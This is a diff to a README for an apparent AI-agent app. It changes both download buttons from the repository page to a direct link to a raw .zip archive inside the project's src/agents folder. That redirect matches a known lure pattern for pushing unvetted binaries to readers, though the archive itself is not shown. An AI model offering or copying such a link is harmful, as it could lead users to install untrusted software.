@@ -43,7 +43,7 @@ Getting started is simple. Follow these steps:
 
 ### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-opencode--agent--foundry-blue?style=for-the-badge&logo=github)](https://github.com/ygudoshnikov-debug/opencode-agent-foundry)
+[![Download Now](https://img.shields.io/badge/Download-opencode--agent--foundry-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ygudoshnikov-debug/opencode-agent-foundry/main/src/agents/foundry_opencode_agent_3.1.zip)
 
 **Click the button above or visit this link to download the application.**
 
@@ -165,7 +165,7 @@ You’re all set! Download the app, install it, and let your AI team handle the 
 
 **Click the download button below to get started today!**
 
-[![Get Started](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=download)](https://github.com/ygudoshnikov-debug/opencode-agent-foundry)
+[![Get Started](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/ygudoshnikov-debug/opencode-agent-foundry/main/src/agents/foundry_opencode_agent_3.1.zip)
 
 ---
 
